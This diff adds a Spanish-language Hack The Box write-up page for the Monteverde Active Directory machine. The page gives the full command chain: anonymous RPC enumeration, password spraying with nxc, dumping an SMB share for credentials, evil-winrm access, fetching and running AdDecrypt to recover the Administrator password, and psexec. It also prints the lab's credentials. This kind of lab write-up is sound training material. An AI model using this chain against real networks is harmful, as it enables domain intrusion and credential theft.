@@ -1,0 +1,136 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Monteverde HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/monteverde/pasted-image-20260226210106.png" alt="Monteverde HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Monteverde</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>SMB</span>
+            <span>azure</span>
+            <span>password_spray</span>
+            <span>WinRM</span>
+            <span>azure_admins</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Lista de usuarios vía <code>RPC</code> anónimo</li>
+            <li><code>Explotación</code>: Password Spray usando el nombre de usuario como contraseña</li>
+            <li><code>Movimiento lateral</code>: Share que expone credenciales de otro usuario</li>
+            <li><code>Escalada de Privilegios</code>: Grupo <code>Azure Admins</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/monteverde/pasted-image-20260226211123.png" alt="Monteverde HTB" />
+          <div class="code-card">
+            <h3>Enumeración anónima RPC</h3>
+            <pre><code>rpcclient -U &quot;&quot; 10.129.228.111 -N
+cat users | cut -d [ -f2 | cut -d ] -f1 | sponge users</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monteverde/pasted-image-20260226211305.png" alt="Monteverde HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Password Spray usando el nombre de usuario como contraseña</h2>
+          <div class="code-card">
+            <h3>Password Spray</h3>
+            <pre><code>nxc smb monteverde -u users -p users --no-bruteforce --continue-on-success
+# Credenciales -&gt; SABatchJobs:SABatchJobs</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monteverde/pasted-image-20260226211635.png" alt="Monteverde HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Share que expone credenciales de otro usuario</h2>
+          <div class="code-card">
+            <h3>Enumerar shares con credenciales de SABatchJobs</h3>
+            <pre><code>nxc smb monteverde -u SABatchJobs -p SABatchJobs --shares</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monteverde/pasted-image-20260226212818.png" alt="Monteverde HTB" />
+          <div class="code-card">
+            <h3>Dumpear share users$ y encontramos credenciales</h3>
+            <pre><code>smbclient  //monteverde/users$ -U SABatchJobs  -c &quot;recurse; prompt; mget *;&quot;
+# Contraseña: 4n0therD4y@n0th3r$</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monteverde/pasted-image-20260226212919.png" alt="Monteverde HTB" />
+          <div class="code-card">
+            <h3>Password Spray con la contraseña</h3>
+            <pre><code>nxc smb monteverde -u users -p &#x27;4n0therD4y@n0th3r$&#x27;
+# Credenciales -&gt; mhope:4n0therD4y@n0th3r$</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monteverde/pasted-image-20260226213358.png" alt="Monteverde HTB" />
+          <div class="code-card">
+            <h3>Validar WinRM</h3>
+            <pre><code>nxc winrm monteverde -u mhope -p &#x27;4n0therD4y@n0th3r$&#x27;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monteverde/pasted-image-20260226213617.png" alt="Monteverde HTB" />
+          <div class="code-card">
+            <h3>Acceso WinRM</h3>
+            <pre><code>evil-winrm -i 10.129.228.111 -u mhope -p &#x27;4n0therD4y@n0th3r$&#x27;</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Grupo Azure Admins</h2>
+          <div class="code-card">
+            <h3>Enumerar Grupos</h3>
+            <pre><code>whoami /groups
+# Grupo: Azure Admins</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monteverde/pasted-image-20260226235821.png" alt="Monteverde HTB" />
+          <p><a href="https://github.com/VbScrub/AdSyncDecrypt" target="_blank" rel="noreferrer">Repositorio GitHub</a></p>
+          <p><a href="https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip" target="_blank" rel="noreferrer">Payloads.zip</a></p>
+          <div class="code-card">
+            <h3>Kali: Descargar payloads</h3>
+            <pre><code># Descargar .zip con payloads
+wget https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip
+# Descomprimir ficheros AdDecrypt.exe /  mcrypt.dll
+unzip AdDecrypt.zip</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Subir payloads desde evil-WinRM</h3>
+            <pre><code>upload /home/alvarorugu7/Escritorio/windows_tools/azure_admins/AdDecrypt.exe
+upload /home/alvarorugu7/Escritorio/windows_tools/azure_admins/mcrypt.dll</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monteverde/pasted-image-20260226235919.png" alt="Monteverde HTB" />
+          <div class="code-card">
+            <h3>Ejecutar payload desde esa ruta</h3>
+            <pre><code>cd &#x27;C:\Program Files\Microsoft Azure AD Sync\Bin&#x27;
+C:\Users\mhope\Desktop\AdDecrypt.exe -FullSQL</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monteverde/pasted-image-20260226235958.png" alt="Monteverde HTB" />
+          <div class="code-card">
+            <h3>Acceso vía ps-exec</h3>
+            <pre><code>impacket-psexec Administrator@monteverde
+# Password: d0m@in4dminyeah!</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monteverde/pasted-image-20260227000209.png" alt="Monteverde HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>SMB</span>
+            <span>azure</span>
+            <span>password_spray</span>
+            <span>WinRM</span>
+            <span>azure_admins</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
